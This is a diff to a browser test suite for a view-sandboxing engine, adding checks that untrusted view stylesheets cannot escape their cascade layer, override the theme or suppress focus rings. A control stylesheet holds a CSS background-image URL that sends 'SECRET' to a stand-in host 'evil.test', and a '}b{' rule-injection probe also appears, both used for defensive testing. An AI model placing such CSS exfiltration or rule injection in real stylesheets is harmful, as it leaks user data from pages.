@@ -28,6 +28,11 @@
  *     the page's own worker, and one that shows no state and changes
  *     nothing still fails; and a view's cards laid in CSS columns are kept
  *     whole in one (Roadmap f-view-authoring-friction-2026-11).
+ *   · Every sheet that tries to leave the layer it is drawn in, given as a
+ *     view's own and as the app's: nothing asks for the address in it, in
+ *     this engine, while a control of the same text left unjudged does; a
+ *     view's rule gets no way past the theme; and neither a view's plain rule
+ *     nor a style attribute takes the root's box, its fade or the ring.
  */
 import { createServer } from "node:http";
 import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
@@ -78,6 +83,17 @@ graview.style(\`
 \`);
 graview.onProps(() => graview.render(graview.html\`<div class="shelf"><h2>Specimens</h2>\${["Granite", "Gneiss", "Basalt", "Obsidian", "Chalk", "Slate"].map((name) => graview.html\`<article class="card" data-key="\${name}"><h3>\${name}</h3><p>A rock a child can hold.</p></article>\`)}</div>\`));
 `;
+
+/* What a view's plain rules and a style attribute try to do to what the host holds. */
+const ROOT_RULES = `
+graview.style("div{display:grid;color:rgb(9,9,9)}*{display:inline;opacity:1}#x{display:block;height:10px;margin:20px 0}");
+graview.onProps(() => graview.render(graview.html\`<p id="x">Margins held</p>\`));
+`;
+const RING = `
+graview.style("button{outline:none !important}#held{transition:outline-color 9999s,outline-width 9999s,outline-offset 9999s;outline-color:transparent}");
+graview.onProps(() => graview.render(graview.html\`<button id="plain">Plain</button><button id="held">Held</button><button id="inline" style="outline:none !important;all:unset !important">Inline</button>\`));
+`;
+const DEAD_SAVE = 'const draw = () => graview.render(graview.html`<button id="save" aria-pressed="true">Save changes</button>`); graview.onProps(() => draw()); graview.on("click", "#save", () => draw());';
 
 export async function pressesSuite({ repoRoot, build, browser, claim, report, HOST, HOST_PORT, viewScript }) {
   const fixture = resolve(repoRoot, "scripts/fixtures/placement-app.ts");
@@ -144,8 +160,10 @@ graview.onProps(draw);`,
     agenda: AGENDA,
     chips: CHIPS,
     columns: COLUMNS,
+    rootrules: ROOT_RULES,
+    ring: RING,
   };
-  const records = { economics: "placement:omar", contract: "placement:rhea", zero: "placement:omar", refused: "placement:omar", owned: "placement:omar", agenda: "placement:rhea", chips: "placement:rhea", columns: "placement:rhea" };
+  const records = { economics: "placement:omar", contract: "placement:rhea", zero: "placement:omar", refused: "placement:omar", owned: "placement:omar", agenda: "placement:rhea", chips: "placement:rhea", columns: "placement:rhea", rootrules: "placement:rhea", ring: "placement:rhea" };
   const scripts = Object.fromEntries(await Promise.all(Object.entries(codes).map(async ([name, code]) => [name, await viewScript(code)])));
   await build({
     stdin: {
@@ -156,6 +174,7 @@ import { runWorkerViewHeadless } from "@graview/guest/headless";
 import { checkPresses } from "@graview/guest/headless/presses";
 import { browserIsolate } from ${JSON.stringify(resolve(repoRoot, "packages/guest/src/headless/browser.ts"))};
 import { ECONOMICS_MANIFEST, kit, placementApp, placementSeed } from ${JSON.stringify(fixture)};
+import { LEAVING } from ${JSON.stringify(resolve(repoRoot, "scripts/fixtures/sheets-that-try-to-leave-their-layer.mjs"))};
 const store = new Store({ schema: placementApp.schema, mutations: placementApp.mutations, policy: placementApp.policy, snapshot: structuredClone(placementSeed) });
 const records = ${JSON.stringify(records)};
 const failures = [];
@@ -166,7 +185,32 @@ for (const [name, script] of Object.entries(window.VIEWS)) {
   document.querySelector("main").appendChild(holder);
   mountWorkerView(holder, { manifest: { ...ECONOMICS_MANIFEST, name }, worker: { script }, store, principal: kit, input: () => ({ node: { id: records[name] } }), onFailure: (reason, detail) => failures.push([name, reason, detail]), onProblem: (said) => problems.push([name, said]) });
 }
+/* Each sheet that tries to leave its layer, as the view's own and as the app's own for every view. */
+const leaving = LEAVING.map(({ name, css }, at) => {
+  const holder = document.createElement("section");
+  holder.dataset.leaving = String(at);
+  document.querySelector("main").appendChild(holder);
+  const source = "graview.style(" + JSON.stringify(css) + ");graview.onProps(() => graview.render(graview.html\`<div class='m'><b>Probe</b><button>Press</button></div>\`));";
+  return { name, view: mountWorkerView(holder, { manifest: { ...ECONOMICS_MANIFEST, name: "leaving-" + at }, worker: { source }, store, principal: kit, input: () => ({ node: { id: "placement:rhea" } }), brand: () => ({ name: "Placements", views: { css } }) }) };
+});
+/* The view's rule, tried past a theme that styles the same element. */
+const pastHolder = document.createElement("section");
+pastHolder.id = "past";
+document.querySelector("main").appendChild(pastHolder);
+mountWorkerView(pastHolder, { manifest: { ...ECONOMICS_MANIFEST, name: "past" }, worker: { source: "graview.style('}b{color:rgb(9,9,9)}');graview.onProps(() => graview.render(graview.html\`<b>Probe</b>\`));" }, store, principal: kit, input: () => ({ node: { id: "placement:rhea" } }), brand: () => ({ name: "Placements", views: { css: "b { color: rgb(200, 30, 30) }" } }) });
 window.__host = {
+  leaving: () => leaving.map(({ name, view }) => ({ name, drawn: view.shadow.querySelector(".m") !== null, refused: view.refused.length, sheet: view.shadow.querySelector("[data-graview-view-style]")?.textContent ?? "", theme: view.shadow.querySelector("[data-graview-view-theme]")?.textContent ?? "", color: view.shadow.querySelector("b") ? getComputedStyle(view.shadow.querySelector("b")).color : null })),
+  /* The control: the first sheet's text as the judges kept it before they refused it, in a layer of its own, proves this engine would ask. */
+  control: () => {
+    const holder = document.createElement("section");
+    document.querySelector("main").appendChild(holder);
+    const shadow = holder.attachShadow({ mode: "open" });
+    const style = document.createElement("style");
+    style.textContent = '@layer probe { @media } div { background-image: url("https://evil.test/control?d=SECRET"); z { } } }';
+    const root = document.createElement("div");
+    root.textContent = "Control";
+    shadow.append(style, root);
+  },
   failures,
   problems,
   log: () => store.log.all().map((op) => ({ author: op.author.id, via: op.via, intent: op.intent })),
@@ -178,7 +222,7 @@ window.__host = {
     return result.ok ? { ok: result.presses.ok, controls: result.presses.controls.map((one) => [one.control, one.ok, one.says]) } : { failed: result.reason, detail: result.detail };
   },
 };
-window.__sources = ${JSON.stringify({ chips: CHIPS })};
+window.__sources = ${JSON.stringify({ chips: CHIPS, dead: DEAD_SAVE })};
 `,
       resolveDir: repoRoot,
       loader: "js",
@@ -260,11 +304,59 @@ window.__handle.drawn().then(() => { window.__ready = true; });
 
   try {
     const context = await browser.newContext({ viewport: { width: 1024, height: 800 }, colorScheme: "light", acceptDownloads: true });
+    /* Every request for the attacker's address, from anywhere in this context, recorded and refused. */
+    const leaked = [];
+    await context.route("https://evil.test/**", (route) => {
+      leaked.push(route.request().url());
+      return route.abort();
+    });
     const tab = await context.newPage();
     tab.on("pageerror", (error) => report.pageErrors.push(String(error).slice(0, 200)));
     await tab.goto(`${HOST}/views/`, { waitUntil: "load" });
     const inView = (name, selector) => tab.locator(`#${name} [data-worker-view]`).locator(selector);
-    for (const name of Object.keys(codes)) await inView(name, name === "agenda" ? "#s5" : name === "contract" ? "#view-contract" : name === "columns" ? ".card" : "button").first().waitFor({ timeout: 20_000 });
+    for (const name of Object.keys(codes)) await inView(name, name === "agenda" ? "#s5" : name === "contract" ? "#view-contract" : name === "columns" ? ".card" : name === "rootrules" ? "#x" : "button").first().waitFor({ timeout: 20_000 });
+
+    // Sheets that try to leave the layer they are drawn in (Roadmap f-view-authoring-friction-2026-11).
+    await tab.waitForFunction(() => window.__host.leaving().every((one) => one.drawn), null, { timeout: 30_000 });
+    await tab.waitForTimeout(500);
+    const sheets = await tab.evaluate(() => window.__host.leaving());
+    claim(`no sheet that tries to leave its layer asks for anything in this engine: ${sheets.length} sheets, each as the view's own and as the app's`, leaked.length === 0, { leaked });
+    claim("and each is said as refused, with no address and no host layer left in what is drawn", sheets.every((one) => one.refused > 0 && !/evil\.test|graview-motion/.test(one.sheet + one.theme)), sheets.filter((one) => one.refused === 0 || /evil\.test|graview-motion/.test(one.sheet + one.theme)));
+    await tab.evaluate(() => window.__host.control());
+    await tab.waitForFunction(() => true);
+    for (let i = 0; i < 40 && leaked.length === 0; i += 1) await tab.waitForTimeout(50);
+    claim("and the same text left unjudged in a layer does ask for it here, so this engine would have shown a leak", leaked.length >= 1 && leaked.every((url) => url === "https://evil.test/control?d=SECRET"), { leaked });
+    const past = await tab.evaluate(() => getComputedStyle(document.querySelector("#past [data-worker-view]").shadowRoot.querySelector("b")).color);
+    claim("a view's }b{color:rgb(9,9,9)} gets no rule past the theme: the element stays the theme's color", past === "rgb(200, 30, 30)", { past });
+
+    // A view's plain rules against the root it is drawn under.
+    const rooted = await tab.evaluate(() => {
+      const root = document.querySelector("#rootrules [data-worker-view]").shadowRoot.querySelector("[data-graview-view-root]");
+      root.setAttribute("data-graview-fade", "");
+      const faded = getComputedStyle(root).opacity;
+      root.removeAttribute("data-graview-fade");
+      return { display: getComputedStyle(root).display, faded, height: root.getBoundingClientRect().height };
+    });
+    claim("a view's div{display:grid} and *{display:inline} leave its root a flow-root that holds its child's margins", rooted.display === "flow-root" && rooted.height >= 50, rooted);
+    claim("and its *{opacity:1} does not hold the root in sight through a fade", rooted.faded === "0", rooted);
+
+    // The ring, against a sheet's !important, a style attribute's, and a transition that would hold it at where it began.
+    const ringOf = async (id) => {
+      await inView("ring", `#${id}`).focus();
+      const engine = browser.browserType().name();
+      await tab.keyboard.press(engine === "webkit" ? "Alt+Shift+Tab" : "Shift+Tab");
+      await tab.keyboard.press(engine === "webkit" ? "Alt+Tab" : "Tab");
+      return tab.evaluate((id) => {
+        const button = document.querySelector("#ring [data-worker-view]").shadowRoot.querySelector("#" + id);
+        const style = getComputedStyle(button);
+        return { visible: button.matches(":focus-visible"), style: style.outlineStyle, width: parseFloat(style.outlineWidth), color: style.outlineColor };
+      }, id);
+    };
+    const rings = { plain: await ringOf("plain"), held: await ringOf("held"), inline: await ringOf("inline") };
+    const ringed = (one) => one.visible && one.style === "solid" && one.width >= 2 && one.color !== "rgba(0, 0, 0, 0)" && one.color !== "transparent";
+    claim("the ring stands against a view's outline:none !important in its sheet", ringed(rings.plain), rings);
+    claim("and against a transition that would hold it at a transparent start", ringed(rings.held), rings);
+    claim("and against outline:none !important and all:unset !important in a style attribute", ringed(rings.inline), rings);
 
     // Controls already in their state, pressed by the check in this page's own worker (Roadmap f-view-authoring-friction-2026-11).
     const chips = await tab.evaluate(() => window.__host.pressCheck(window.__sources.chips));
@@ -277,6 +369,8 @@ window.__handle.drawn().then(() => { window.__ready = true; });
     claim("and still fails a control that shows no state and changes nothing when pressed: “Shuffle” does nothing", chips.ok === false && chip("“Shuffle”")?.[1] === false && /does nothing when pressed/.test(chip("“Shuffle”")?.[2] ?? ""), chips);
     await inView("chips", "#all").click();
     await tab.waitForTimeout(300);
+    const dead = await tab.evaluate(() => window.__host.pressCheck(window.__sources.dead));
+    claim("and fails a Save with a dead handler that says aria-pressed=\"true\": a state alone does not excuse it", dead.ok === false && /Save changes/.test(dead.controls?.[0]?.[0] ?? "") && dead.controls?.[0]?.[1] === false, dead);
     claim("pressed on the page, “All” leaves the view as it is and nothing is said of it", (await tab.evaluate(() => window.__host.problems.filter(([name]) => name === "chips").length)) === 0 && (await inView("chips", "#all").getAttribute("aria-pressed")) === "true");
 
     // Cards in CSS columns (Roadmap f-view-authoring-friction-2026-11).
